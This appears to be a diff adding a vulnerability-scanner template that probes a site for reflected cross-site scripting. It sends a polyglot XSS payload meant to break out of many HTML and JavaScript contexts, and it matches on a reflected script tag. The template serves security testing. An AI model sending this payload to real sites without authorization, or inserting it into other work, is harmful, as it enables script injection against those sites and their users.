@@ -1,0 +1,17 @@
+id: K70n0s510-xss-polyglot
+info:
+  name: Advanced XSS Polyglot
+  author: K70n0s510
+  severity: high
+  description: Uses a complex polyglot string to break out of 20+ different contexts (href, src, script, etc).
+  tags: xss,polyglot
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?q=jaVasCript:/*-/*%60/*%60/*%27/*%22/**/(/* */oNcliCk=alert(1337) )//%250D%250A%0D%0A//%3C/TITLE/%3C/SCRIPT/%3E--%3E%3CSCRIPT%3Ealert(1337)%3C/SCRIPT%3E"]
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["<SCRIPT>alert(1337)</SCRIPT>"]
+      - type: word
+        part: header
+        words: ["text/html"]
